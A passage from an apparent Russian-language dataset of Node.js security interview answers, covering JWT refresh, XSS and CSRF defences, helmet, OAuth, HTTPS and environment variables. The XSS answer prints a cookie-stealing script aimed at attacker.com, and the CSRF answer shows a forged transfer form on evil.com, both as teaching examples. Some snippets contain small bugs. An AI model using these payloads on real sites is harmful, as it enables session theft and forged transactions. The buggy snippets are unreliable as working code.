});\n    }\n\n    next();\n  };\n}\n\n// Только для admin\napp.delete('/users/:id', authenticate, authorize('admin'), (req, res) => {\n  res.json({ message: 'User deleted' });\n});\n```\n\n**Refresh Token механизм:**\n\n```javascript\n// Генерация Access + Refresh токенов\napp.post('/login', async (req, res) => {\n  const user = await authenticateUser(req.body);\n\n  // Access token (короткий срок жизни)\n  const accessToken = jwt.sign(\n    { userId: user._id, role: user.role },\n    JWT_SECRET,\n    { expiresIn: '15m' }\n  );\n\n  // Refresh token (длинный срок жизни)\n  const refreshToken = jwt.sign(\n    { userId: user._id },\n    JWT_REFRESH_SECRET,\n    { expiresIn: '7d' }\n  );\n\n  // Сохранение refresh token в БД\n  await RefreshToken.create({\n    userId: user._id,\n    token: refreshToken,\n    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)\n  });\n\n  res.json({ accessToken, refreshToken });\n});\n\n// Обновление access token\napp.post('/refresh', async (req, res) => {\n  const { refreshToken } = req.body;\n\n  if (!refreshToken) {\n    return res.status(401).json({ error: 'Refresh token required' });\n  }\n\n  try {\n    // Проверка refresh token\n    const decoded = jwt.verify(refreshToken, JWT_REFRESH_SECRET);\n\n    // Проверка что токен есть в БД\n    const storedToken = await RefreshToken.findOne({\n      userId: decoded.userId,\n      token: refreshToken\n    });\n\n    if (!storedToken) {\n      return res.status(401).json({ error: 'Invalid refresh token' });\n    }\n\n    // Генерация нового access token\n    const accessToken = jwt.sign(\n      { userId: decoded.userId, role: user.role },\n      JWT_SECRET,\n      { expiresIn: '15m' }\n    );\n\n    res.json({ accessToken });\n  } catch (err) {\n    res.status(401).json({ error: 'Invalid refresh token' });\n  }\n});\n\n// Выход (revoke токена)\napp.post('/logout', authenticate, async (req, res) => {\n  const { refreshToken } = req.body;\n\n  await RefreshToken.deleteOne({\n    userId: req.user.userId,\n    token: refreshToken\n  });\n\n  res.json({ message: 'Logged out' });\n});\n```\n\n**Клиент (Frontend):**\n\n```javascript\n// Сохранение токена\nlocalStorage.setItem('accessToken', response.accessToken);\nlocalStorage.setItem('refreshToken', response.refreshToken);\n\n// Использование токена в запросах\nconst token = localStorage.getItem('accessToken');\nconst response = await fetch('/api/profile', {\n  headers: {\n    'Authorization': `Bearer ${token}`\n  }\n});\n\n// Автоматическое обновление при истечении\nasync function fetchWithRefresh(url, options = {}) {\n  let token = localStorage.getItem('accessToken');\n\n  let response = await fetch(url, {\n    ...options,\n    headers: {\n      ...options.headers,\n      'Authorization': `Bearer ${token}`\n    }\n  });\n\n  // Если токен истек\n  if (response.status === 401) {\n    // Обновляем токен\n    const refreshToken = localStorage.getItem('refreshToken');\n    const refreshResponse = await fetch('/auth/refresh', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ refreshToken })\n    });\n\n    if (refreshResponse.ok) {\n      const { accessToken } = await refreshResponse.json();\n      localStorage.setItem('accessToken', accessToken);\n\n      // Повторяем исходный запрос\n      response = await fetch(url, {\n        ...options,\n        headers: {\n          ...options.headers,\n          'Authorization': `Bearer ${accessToken}`\n        }\n      });\n    }\n  }\n\n  return response;\n}\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 43,
          "question_number_in_chapter": 5,
          "question_chapter": 6,
          "question_title": "В чем разница между XSS и CSRF атаками? Как защититься?",
          "answer_markdown": "\n**Ответ:**\n\n**XSS (Cross-Site Scripting)** и **CSRF (Cross-Site Request Forgery)** - это две разные веб-уязвимости.\n\n**XSS - внедрение вредоносного скрипта:**\n\n```javascript\n// ❌ УЯЗВИМЫЙ КОД\napp.get('/search', (req, res) => {\n  const { query } = req.query;\n\n  // Прямой вывод пользовательского ввода\n  res.send(`<h1>Results for: ${query}</h1>`);\n});\n\n// Атака:\n// GET /search?query=<script>alert(document.cookie)</script>\n// Результат: выполнение JavaScript в браузере пользователя!\n\n// GET /search?query=<script>fetch('http://attacker.com?cookie='+document.cookie)</script>\n// Результат: кража cookies!\n```\n\n**Защита от XSS:**\n\n```javascript\n// 1. Экранирование HTML (используйте template engines)\nconst ejs = require('ejs');\n\napp.get('/search', (req, res) => {\n  const { query } = req.query;\n\n  // EJS автоматически экранирует\n  res.render('search', { query });\n});\n\n// В search.ejs:\n// <h1>Results for: <%= query %></h1>\n// Вывод: &lt;script&gt;alert()&lt;/script&gt;\n\n// 2. Санитизация HTML\nconst createDOMPurify = require('dompurify');\nconst { JSDOM } = require('jsdom');\n\nconst window = new JSDOM('').window;\nconst DOMPurify = createDOMPurify(window);\n\napp.post('/comment', (req, res) => {\n  const { content } = req.body;\n\n  // Очистка от вредоносных тегов\n  const clean = DOMPurify.sanitize(content);\n\n  await Comment.create({ content: clean });\n  res.json({ message: 'Comment saved' });\n});\n\n// 3. Content Security Policy (CSP)\nconst helmet = require('helmet');\n\napp.use(helmet.contentSecurityPolicy({\n  directives: {\n    defaultSrc: [\"'self'\"],\n    scriptSrc: [\"'self'\", \"https://trusted-cdn.com\"],\n    styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n    imgSrc: [\"'self'\", \"data:\", \"https:\"],\n    connectSrc: [\"'self'\"],\n    fontSrc: [\"'self'\"],\n    objectSrc: [\"'none'\"],\n    upgradeInsecureRequests: []\n  }\n}));\n\n// 4. httpOnly cookies\nres.cookie('token', jwt, {\n  httpOnly: true, // JavaScript не может прочитать cookie\n  secure: true,\n  sameSite: 'strict'\n});\n```\n\n**CSRF - подделка межсайтовых запросов:**\n\n```javascript\n// ❌ УЯЗВИМЫЙ КОД\napp.post('/transfer', authenticate, async (req, res) => {\n  const { to, amount } = req.body;\n\n  await transferMoney(req.user.id, to, amount);\n  res.json({ message: 'Transfer successful' });\n});\n\n// Атака:\n// Злоумышленник создает сайт evil.com с формой:\n// <form action=\"https://bank.com/transfer\" method=\"POST\">\n//   <input name=\"to\" value=\"attacker-account\">\n//   <input name=\"amount\" value=\"1000\">\n//   <button>Click here for free gift!</button>\n// </form>\n//\n// Когда пользователь (залогиненный в bank.com) нажимает кнопку,\n// браузер отправляет POST запрос с cookies пользователя!\n```\n\n**Защита от CSRF:**\n\n```javascript\n// 1. CSRF токены\nconst csrf = require('csurf');\nconst csrfProtection = csrf({ cookie: true });\n\napp.use(csrf Protection);\n\n// GET форма\napp.get('/transfer-form', csrfProtection, (req, res) => {\n  res.render('transfer', { csrfToken: req.csrfToken() });\n});\n\n// В HTML:\n// <form action=\"/transfer\" method=\"POST\">\n//   <input type=\"hidden\" name=\"_csrf\" value=\"<%= csrfToken %>\">\n//   <input name=\"to\">\n//   <input name=\"amount\">\n//   <button>Transfer</button>\n// </form>\n\n// POST обработка\napp.post('/transfer', csrfProtection, async (req, res) => {\n  // csrfProtection middleware проверяет токен\n  const { to, amount } = req.body;\n  await transferMoney(req.user.id, to, amount);\n  res.json({ message: 'Transfer successful' });\n});\n\n// 2. SameSite cookies\nres.cookie('sessionId', sessionId, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict' // или 'lax'\n});\n\n// SameSite=Strict: cookie не отправляется при cross-site запросах\n// SameSite=Lax: cookie отправляется только при GET запросах\n\n// 3. Проверка Origin/Referer заголовков\napp.use((req, res, next) => {\n  const origin = req.headers.origin || req.headers.referer;\n\n  if (req.method !== 'GET' && !origin?.includes('yoursite.com')) {\n    return res.status(403).json({ error: 'Forbidden' });\n  }\n\n  next();\n});\n\n// 4. Требовать подтверждения для критических операций\napp.post('/transfer', authenticate, async (req, res) => {\n  const { to, amount, password } = req.body;\n\n  // Требуем повторный ввод пароля\n  const user = await User.findById(req.user.id);\n  if (!(await user.comparePassword(password))) {\n    return res.status(401).json({ error: 'Invalid password' });\n  }\n\n  await transferMoney(req.user.id, to, amount);\n  res.json({ message: 'Transfer successful' });\n});\n```\n\n**Сравнение XSS vs CSRF:**\n\n| Характеристика | XSS | CSRF |\n|----------------|-----|------|\n| **Что внедряется** | Вредоносный скрипт | Поддельный запрос |\n| **Где выполняется** | В браузере жертвы | На сервере |\n| **Что крадется** | Cookies, данные, sessions | Выполняются действия от имени жертвы |\n| **Защита** | Экранирование, CSP, httpOnly | CSRF токены, SameSite cookies |\n| **Требуется** | Уязвимость в input/output | Аутентифицированная сессия |\n\n**Комплексная защита:**\n\n```javascript\nconst express = require('express');\nconst helmet = require('helmet');\nconst csrf = require('csurf');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\n\n// 1. Базовая безопасность\napp.use(helmet());\napp.use(helmet.contentSecurityPolicy({\n  directives: {\n    defaultSrc: [\"'self'\"],\n    scriptSrc: [\"'self'\"],\n    styleSrc: [\"'self'\", \"'unsafe-inline'\"]\n  }\n}));\n\n// 2. CSRF защита\napp.use(cookieParser());\napp.use(csrf({ cookie: true }));\n\n// 3. Secure cookies\napp.use((req, res, next) => {\n  res.cookie('XSRF-TOKEN', req.csrfToken(), {\n    httpOnly: false, // Фронтенд должен прочитать для отправки\n    secure: true,\n    sameSite: 'strict'\n  });\n  next();\n});\n\n// 4. Input validation и sanitization\nconst { body } = require('express-validator');\n\napp.post('/comment',\n  body('content').trim().escape(),\n  async (req, res) => {\n    const { content } = req.body;\n    await Comment.create({ content });\n    res.json({ message: 'Comment saved' });\n  }\n);\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 44,
          "question_number_in_chapter": 6,
          "question_chapter": 6,
          "question_title": "Что такое helmet.js и зачем он нужен?",
          "answer_markdown": "\n**Ответ:**\n\n**Helmet.js** - это middleware для Express.js, который устанавливает различные HTTP заголовки для защиты приложения от распространенных веб-уязвимостей.\n\n**Установка:**\n\n```bash\nnpm install helmet\n```\n\n**Базовое использование:**\n\n```javascript\nconst express = require('express');\nconst helmet = require('helmet');\n\nconst app = express();\n\n// Применяем все защиты по умолчанию\napp.use(helmet());\n\napp.get('/', (req, res) => {\n  res.send('Hello World');\n});\n```\n\n**Что делает helmet():**\n\n```javascript\n// helmet() это короткая запись для:\napp.use(helmet.contentSecurityPolicy());\napp.use(helmet.crossOriginEmbedderPolicy());\napp.use(helmet.crossOriginOpenerPolicy());\napp.use(helmet.crossOriginResourcePolicy());\napp.use(helmet.dnsPrefetchControl());\napp.use(helmet.expectCt());\napp.use(helmet.frameguard());\napp.use(helmet.hidePoweredBy());\napp.use(helmet.hsts());\napp.use(helmet.ieNoOpen());\napp.use(helmet.noSniff());\napp.use(helmet.originAgentCluster());\napp.use(helmet.permittedCrossDomainPolicies());\napp.use(helmet.referrerPolicy());\napp.use(helmet.xssFilter());\n```\n\n**Основные заголовки и их назначение:**\n\n**1. Content-Security-Policy (CSP):**\n\n```javascript\n// Защита от XSS атак\napp.use(helmet.contentSecurityPolicy({\n  directives: {\n    defaultSrc: [\"'self'\"],\n    scriptSrc: [\"'self'\", \"https://trusted-cdn.com\"],\n    styleSrc: [\"'self'\", \"'unsafe-inline'\"], // Разрешить inline стили\n    imgSrc: [\"'self'\", \"data:\", \"https:\"],\n    fontSrc: [\"'self'\", \"https://fonts.gstatic.com\"],\n    connectSrc: [\"'self'\", \"https://api.example.com\"],\n    frameSrc: [\"'none'\"],\n    objectSrc: [\"'none'\"],\n    upgradeInsecureRequests: []\n  }\n}));\n\n// Устанавливает заголовок:\n// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; ...\n```\n\n**2. X-Frame-Options:**\n\n```javascript\n// Защита от clickjacking\napp.use(helmet.frameguard({ action: 'deny' }));\n\n// Опции:\n// - 'deny': запретить отображение в iframe\n// - 'sameorigin': разрешить только same-origin\n// - { action: 'allow-from', domain: 'https://example.com' }\n\n// Устанавливает заголовок:\n// X-Frame-Options: DENY\n```\n\n**3. Strict-Transport-Security (HSTS):**\n\n```javascript\n// Принудительное использование HTTPS\napp.use(helmet.hsts({\n  maxAge: 31536000, // 1 год\n  includeSubDomains: true,\n  preload: true\n}));\n\n// Устанавливает заголовок:\n// Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n```\n\n**4. X-Content-Type-Options:**\n\n```javascript\n// Запрет MIME-sniffing\napp.use(helmet.noSniff());\n\n// Устанавливает заголовок:\n// X-Content-Type-Options: nosniff\n```\n\n**5. X-XSS-Protection:**\n\n```javascript\n// Включение XSS фильтра браузера (устаревший, но полезный)\napp.use(helmet.xssFilter());\n\n// Устанавливает заголовок:\n// X-XSS-Protection: 1; mode=block\n```\n\n**6. Referrer-Policy:**\n\n```javascript\n// Контроль отправки Referer заголовка\napp.use(helmet.referrerPolicy({\n  policy: 'no-referrer'\n}));\n\n// Опции: 'no-referrer', 'same-origin', 'strict-origin-when-cross-origin'\n\n// Устанавливает заголовок:\n// Referrer-Policy: no-referrer\n```\n\n**7. Hide Powered-By:**\n\n```javascript\n// Скрыть информацию о используемом фреймворке\napp.use(helmet.hidePoweredBy());\n\n// Удаляет заголовок:\n// X-Powered-By: Express\n```\n\n**Кастомная конфигурация:**\n\n```javascript\nconst helmet = require('helmet');\n\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\"'self'\", \"'unsafe-inline'\", \"https://cdn.jsdelivr.net\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      imgSrc: [\"'self'\", \"data:\", \"https:\"],\n      connectSrc: [\"'self'\", \"https://api.example.com\"],\n      fontSrc: [\"'self'\", \"https://fonts.gstatic.com\"],\n      objectSrc: [\"'none'\"],\n      upgradeInsecureRequests: []\n    }\n  },\n  hsts: {\n    maxAge: 31536000,\n    includeSubDomains: true,\n    preload: true\n  },\n  frameguard: {\n    action: 'deny'\n  },\n  referrerPolicy: {\n    policy: 'same-origin'\n  }\n}));\n```\n\n**Отключение отдельных защит:**\n\n```javascript\napp.use(helmet({\n  contentSecurityPolicy: false, // Отключить CSP\n  frameguard: false // Отключить X-Frame-Options\n}));\n\n// Или:\napp.use(helmet.contentSecurityPolicy({\n  directives: {\n    ...helmet.contentSecurityPolicy.getDefaultDirectives(),\n    \"script-src\": [\"'self'\", \"'unsafe-inline'\"] // Переопределить\n  }\n}));\n```\n\n**Практический пример - полная защита:**\n\n```javascript\nconst express = require('express');\nconst helmet = require('helmet');\nconst cors = require('cors');\nconst rateLimit = require('express-rate-limit');\n\nconst app = express();\n\n// 1. Helmet для HTTP заголовков\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\n        \"'self'\",\n        \"https://cdn.jsdelivr.net\",\n        \"https://unpkg.com\"\n      ],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      imgSrc: [\"'self'\", \"data:\", \"https:\"],\n      connectSrc: [\"'self'\", \"https://api.example.com\"],\n      fontSrc: [\"'self'\", \"https://fonts.gstatic.com\"],\n      objectSrc: [\"'none'\"],\n      upgradeInsecureRequests: []\n    }\n  },\n  hsts: {\n    maxAge: 31536000,\n    includeSubDomains: true,\n    preload: true\n  }\n}));\n\n// 2. CORS\napp.use(cors({\n  origin: process.env.ALLOWED_ORIGINS?.split(','),\n  credentials: true\n}));\n\n// 3. Rate limiting\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100\n});\napp.use(limiter);\n\n// 4. Body parsing\napp.use(express.json({ limit: '10mb' }));\n\n// Роуты\napp.get('/', (req, res) => {\n  res.send('Secure app with Helmet');\n});\n\napp.listen(3000);\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 45,
          "question_number_in_chapter": 7,
          "question_chapter": 6,
          "question_title": "Как реализовать OAuth 2.0 аутентификацию в Node.js?",
          "answer_markdown": "\n**Ответ:**\n\n**OAuth 2.0** - это протокол авторизации, позволяющий пользователям входить через сторонние сервисы (Google, GitHub, Facebook и т.д.) без передачи пароля.\n\n**OAuth 2.0 Flow:**\n\n```\n1. Пользователь → Приложение: \"Войти через Google\"\n2. Приложение → Google: Redirect с client_id\n3. Google → Пользователь: Форма входа\n4. Пользователь → Google: Ввод логина/пароля\n5. Google → Приложение: Authorization code\n6. Приложение → Google: Обмен code на access_token\n7. Google → Приложение: access_token\n8. Приложение → Google: Запрос данных пользователя с access_token\n9. Google → Приложение: Данные пользователя\n10. Приложение → Пользователь: Вход выполнен\n```\n\n**Реализация с Passport.js:**\n\n```bash\nnpm install passport passport-google-oauth20 express-session\n```\n\n```javascript\nconst express = require('express');\nconst passport = require('passport');\nconst GoogleStrategy = require('passport-google-oauth20').Strategy;\nconst session = require('express-session');\n\nconst app = express();\n\n// Session middleware\napp.use(session({\n  secret: process.env.SESSION_SECRET,\n  resave: false,\n  saveUninitialized: false,\n  cookie: {\n    secure: process.env.NODE_ENV === 'production',\n    httpOnly: true,\n    maxAge: 24 * 60 * 60 * 1000 // 24 часа\n  }\n}));\n\n// Passport initialization\napp.use(passport.initialize());\napp.use(passport.session());\n\n// Google Strategy\npassport.use(new GoogleStrategy({\n    clientID: process.env.GOOGLE_CLIENT_ID,\n    clientSecret: process.env.GOOGLE_CLIENT_SECRET,\n    callbackURL: '/auth/google/callback'\n  },\n  async (accessToken, refreshToken, profile, done) => {\n    try {\n      // Найти или создать пользователя\n      let user = await User.findOne({ googleId: profile.id });\n\n      if (!user) {\n        user = await User.create({\n          googleId: profile.id,\n          email: profile.emails[0].value,\n          name: profile.displayName,\n          avatar: profile.photos[0].value\n        });\n      }\n\n      return done(null, user);\n    } catch (err) {\n      return done(err, null);\n    }\n  }\n));\n\n// Сериализация пользователя\npassport.serializeUser((user, done) => {\n  done(null, user.id);\n});\n\npassport.deserializeUser(async (id, done) => {\n  try {\n    const user = await User.findById(id);\n    done(null, user);\n  } catch (err) {\n    done(err, null);\n  }\n});\n\n// Routes\napp.get('/auth/google',\n  passport.authenticate('google', {\n    scope: ['profile', 'email']\n  })\n);\n\napp.get('/auth/google/callback',\n  passport.authenticate('google', { failureRedirect: '/login' }),\n  (req, res) => {\n    // Успешная аутентификация\n    res.redirect('/dashboard');\n  }\n);\n\n// Защищенный роут\nfunction ensureAuthenticated(req, res, next) {\n  if (req.isAuthenticated()) {\n    return next();\n  }\n  res.redirect('/login');\n}\n\napp.get('/dashboard', ensureAuthenticated, (req, res) => {\n  res.json({\n    message: 'Dashboard',\n    user: req.user\n  });\n});\n\n// Выход\napp.get('/logout', (req, res) => {\n  req.logout((err) => {\n    if (err) return next(err);\n    res.redirect('/');\n  });\n});\n```\n\n**Множественные провайдеры (Google + GitHub):**\n\n```javascript\nconst GitHubStrategy = require('passport-github2').Strategy;\n\n// GitHub Strategy\npassport.use(new GitHubStrategy({\n    clientID: process.env.GITHUB_CLIENT_ID,\n    clientSecret: process.env.GITHUB_CLIENT_SECRET,\n    callbackURL: '/auth/github/callback'\n  },\n  async (accessToken, refreshToken, profile, done) => {\n    try {\n      let user = await User.findOne({ githubId: profile.id });\n\n      if (!user) {\n        user = await User.create({\n          githubId: profile.id,\n          username: profile.username,\n          email: profile.emails[0].value,\n          name: profile.displayName\n        });\n      }\n\n      return done(null, user);\n    } catch (err) {\n      return done(err, null);\n    }\n  }\n));\n\n// Routes\napp.get('/auth/github',\n  passport.authenticate('github', { scope: ['user:email'] })\n);\n\napp.get('/auth/github/callback',\n  passport.authenticate('github', { failureRedirect: '/login' }),\n  (req, res) => {\n    res.redirect('/dashboard');\n  }\n);\n```\n\n**Альтернатива: ручная реализация OAuth 2.0:**\n\n```javascript\nconst axios = require('axios');\nconst querystring = require('querystring');\n\n// Шаг 1: Redirect на Google\napp.get('/auth/google', (req, res) => {\n  const params = {\n    client_id: process.env.GOOGLE_CLIENT_ID,\n    redirect_uri: 'http://localhost:3000/auth/google/callback',\n    response_type: 'code',\n    scope: 'openid email profile',\n    access_type: 'offline',\n    prompt: 'consent'\n  };\n\n  const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?${querystring.stringify(params)}`;\n  res.redirect(authUrl);\n});\n\n// Шаг 2: Callback с authorization code\napp.get('/auth/google/callback', async (req, res) => {\n  const { code } = req.query;\n\n  try {\n    // Шаг 3: Обмен code на access_token\n    const tokenResponse = await axios.post('https://oauth2.googleapis.com/token', {\n      code,\n      client_id: process.env.GOOGLE_CLIENT_ID,\n      client_secret: process.env.GOOGLE_CLIENT_SECRET,\n      redirect_uri: 'http://localhost:3000/auth/google/callback',\n      grant_type: 'authorization_code'\n    });\n\n    const { access_token, refresh_token } = tokenResponse.data;\n\n    // Шаг 4: Получение данных пользователя\n    const userResponse = await axios.get('https://www.googleapis.com/oauth2/v2/userinfo', {\n      headers: {\n        Authorization: `Bearer ${access_token}`\n      }\n    });\n\n    const { id, email, name, picture } = userResponse.data;\n\n    // Создание или обновление пользователя\n    let user = await User.findOne({ googleId: id });\n    if (!user) {\n      user = await User.create({\n        googleId: id,\n        email,\n        name,\n        avatar: picture\n      });\n    }\n\n    // Создание JWT сессии\n    const token = jwt.sign(\n      { userId: user._id },\n      process.env.JWT_SECRET,\n      { expiresIn: '7d' }\n    );\n\n    res.cookie('token', token, {\n      httpOnly: true,\n      secure: process.env.NODE_ENV === 'production',\n      sameSite: 'strict',\n      maxAge: 7 * 24 * 60 * 60 * 1000\n    });\n\n    res.redirect('/dashboard');\n  } catch (err) {\n    console.error(err);\n    res.redirect('/login?error=oauth_failed');\n  }\n});\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 46,
          "question_number_in_chapter": 8,
          "question_chapter": 6,
          "question_title": "Что такое HTTPS? Как настроить HTTPS сервер в Node.js?",
          "answer_markdown": "\n**Ответ:**\n\n**HTTPS (HTTP Secure)** - это защищенная версия HTTP протокола, использующая TLS/SSL для шифрования данных между клиентом и сервером.\n\n**Зачем нужен HTTPS:**\n\n1. **Шифрование данных** - защита от прослушивания (man-in-the-middle атаки)\n2. **Аутентификация** - подтверждение подлинности сервера через SSL сертификаты\n3. **Целостность данных** - защита от изменения данных при передаче\n4. **SEO преимущества** - Google ранжирует HTTPS сайты выше\n5. **Доверие пользователей** - браузеры помечают HTTP сайты как небезопасные\n6. **Требование для современных API** - Service Workers, HTTP/2, Geolocation API требуют HTTPS\n\n**Создание HTTPS сервера в Node.js:**\n\n```javascript\nconst https = require('https');\nconst fs = require('fs');\nconst express = require('express');\n\nconst app = express();\n\n// Чтение SSL сертификатов\nconst options = {\n  key: fs.readFileSync('./ssl/private-key.pem'),\n  cert: fs.readFileSync('./ssl/certificate.pem'),\n  // Опционально: цепочка сертификатов\n  ca: fs.readFileSync('./ssl/ca-bundle.pem')\n};\n\n// Создание HTTPS сервера\nconst server = https.createServer(options, app);\n\napp.get('/', (req, res) => {\n  res.send('Secure HTTPS connection!');\n});\n\nserver.listen(443, () => {\n  console.log('HTTPS Server running on https://localhost:443');\n});\n```\n\n**Генерация самоподписанного сертификата (для разработки):**\n\n```bash\n# Генерация приватного ключа\nopenssl genrsa -out private-key.pem 2048\n\n# Генерация самоподписанного сертификата\nopenssl req -new -x509 -key private-key.pem -out certificate.pem -days 365\n\n# Для production используйте Let's Encrypt:\n# sudo certbot certonly --standalone -d yourdomain.com\n```\n\n**HTTP → HTTPS редирект:**\n\n```javascript\nconst http = require('http');\nconst https = require('https');\nconst express = require('express');\n\nconst app = express();\n\n// Middleware для редиректа HTTP → HTTPS\napp.use((req, res, next) => {\n  if (req.protocol === 'http') {\n    return res.redirect(301, `https://${req.headers.host}${req.url}`);\n  }\n  next();\n});\n\napp.get('/', (req, res) => {\n  res.send('Secure connection');\n});\n\n// HTTP сервер на порту 80 (для редиректа)\nhttp.createServer((req, res) => {\n  res.writeHead(301, { Location: `https://${req.headers.host}${req.url}` });\n  res.end();\n}).listen(80);\n\n// HTTPS сервер на порту 443\nconst options = {\n  key: fs.readFileSync('./ssl/private-key.pem'),\n  cert: fs.readFileSync('./ssl/certificate.pem')\n};\n\nhttps.createServer(options, app).listen(443, () => {\n  console.log('Server running on https://localhost:443');\n});\n```\n\n**Использование Let's Encrypt (Certbot) для production:**\n\n```javascript\nconst https = require('https');\nconst fs = require('fs');\nconst express = require('express');\nconst path = require('path');\n\nconst app = express();\n\n// Пути к сертификатам Let's Encrypt\nconst SSL_DIR = '/etc/letsencrypt/live/yourdomain.com';\n\nconst options = {\n  key: fs.readFileSync(path.join(SSL_DIR, 'privkey.pem')),\n  cert: fs.readFileSync(path.join(SSL_DIR, 'cert.pem')),\n  ca: fs.readFileSync(path.join(SSL_DIR, 'chain.pem'))\n};\n\nhttps.createServer(options, app).listen(443);\n```\n\n**Настройка безопасности HTTPS (TLS):**\n\n```javascript\nconst crypto = require('crypto');\n\nconst options = {\n  key: fs.readFileSync('./ssl/private-key.pem'),\n  cert: fs.readFileSync('./ssl/certificate.pem'),\n\n  // Минимальная версия TLS (рекомендуется TLSv1.2+)\n  minVersion: 'TLSv1.2',\n\n  // Отключаем устаревшие протоколы\n  secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |\n                  crypto.constants.SSL_OP_NO_SSLv3 |\n                  crypto.constants.SSL_OP_NO_TLSv1 |\n                  crypto.constants.SSL_OP_NO_TLSv1_1,\n\n  // Рекомендуемые cipher suites\n  ciphers: [\n    'ECDHE-ECDSA-AES128-GCM-SHA256',\n    'ECDHE-RSA-AES128-GCM-SHA256',\n    'ECDHE-ECDSA-AES256-GCM-SHA384',\n    'ECDHE-RSA-AES256-GCM-SHA384'\n  ].join(':'),\n\n  // Приоритет cipher suites сервера\n  honorCipherOrder: true,\n\n  // Для HTTP/2 support\n  allowHTTP1: true\n};\n\nconst server = https.createServer(options, app);\n```\n\n**HTTPS с Express + helmet:**\n\n```javascript\nconst express = require('express');\nconst helmet = require('helmet');\nconst https = require('https');\nconst fs = require('fs');\n\nconst app = express();\n\n// Security headers\napp.use(helmet());\n\n// HSTS (HTTP Strict Transport Security)\napp.use(helmet.hsts({\n  maxAge: 31536000,  // 1 год\n  includeSubDomains: true,\n  preload: true\n}));\n\n// Редирект с HTTP на HTTPS\napp.use((req, res, next) => {\n  if (!req.secure && req.get('x-forwarded-proto') !== 'https') {\n    return res.redirect(`https://${req.get('host')}${req.url}`);\n  }\n  next();\n});\n\nconst options = {\n  key: fs.readFileSync('./ssl/private-key.pem'),\n  cert: fs.readFileSync('./ssl/certificate.pem')\n};\n\nhttps.createServer(options, app).listen(443);\n```\n\n**Проверка сертификата в runtime:**\n\n```javascript\nconst tls = require('tls');\n\n// Создание HTTPS сервера с проверкой клиентского сертификата\nconst options = {\n  key: fs.readFileSync('./ssl/server-key.pem'),\n  cert: fs.readFileSync('./ssl/server-cert.pem'),\n\n  // Требовать клиентский сертификат (mutual TLS)\n  requestCert: true,\n  rejectUnauthorized: true,\n\n  // CA для проверки клиентских сертификатов\n  ca: [fs.readFileSync('./ssl/client-ca.pem')]\n};\n\nconst server = https.createServer(options, app);\n\nserver.on('secureConnection', (tlsSocket) => {\n  const cert = tlsSocket.getPeerCertificate();\n\n  if (cert && cert.subject) {\n    console.log('Client certificate:', cert.subject.CN);\n  }\n});\n```\n\n**Автоматическое обновление сертификатов Let's Encrypt:**\n\n```javascript\nconst fs = require('fs');\nconst https = require('https');\n\nfunction loadCertificates() {\n  return {\n    key: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/privkey.pem'),\n    cert: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/cert.pem'),\n    ca: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/chain.pem')\n  };\n}\n\nlet options = loadCertificates();\nconst server = https.createServer(options, app);\n\n// Перезагрузка сертификатов каждые 12 часов\nsetInterval(() => {\n  try {\n    const newOptions = loadCertificates();\n\n    // Обновляем context сервера\n    server.setSecureContext(newOptions);\n\n    console.log('SSL certificates reloaded successfully');\n  } catch (err) {\n    console.error('Failed to reload certificates:', err);\n  }\n}, 12 * 60 * 60 * 1000);  // 12 часов\n\nserver.listen(443);\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 47,
          "question_number_in_chapter": 9,
          "question_chapter": 6,
          "question_title": "Как работают environment variables? Best practices для работы с секретами",
          "answer_markdown": "\n**Ответ:**\n\n**Environment Variables (переменные окружения)** - это динамические значения, которые влияют на поведение процессов в операционной системе. В Node.js они доступны через `process.env`.\n\n**Зачем используются:**\n\n1. **Конфигурация приложения** - различные настройки для dev/staging/production\n2. **Секреты и токены** - API keys, database credentials, JWT secrets\n3. **Feature flags** - включение/выключение функций\n4. **12-Factor App принцип** - хранение конфигурации в окружении\n\n**Доступ к environment variables:**\n\n```javascript\n// Чтение переменной окружения\nconst dbHost = process.env.DB_HOST;\nconst port = process.env.PORT || 3000;  // значение по умолчанию\n\nconsole.log('Database:', process.env.DB_HOST);\nconsole.log('Port:', process.env.PORT);\nconsole.log('Environment:', process.env.NODE_ENV);  // 'development', 'production', etc.\n```\n\n**Установка environment variables:**\n\n```bash\n# Временно для одной команды\nPORT=4000 node app.js\n\n# Экспорт для текущей сессии (Linux/Mac)\nexport DB_HOST=localhost\nexport DB_PORT=5432\nnode app.js\n\n# Windows (CMD)\nset DB_HOST=localhost\nset DB_PORT=5432\nnode app.js\n\n# Windows (PowerShell)\n$env:DB_HOST = \"localhost\"\n$env:DB_PORT = \"5432\"\nnode app.js\n```\n\n**Использование .env файлов (dotenv):**\n\n```bash\nnpm install dotenv\n```\n\n```javascript\n// .env файл (в корне 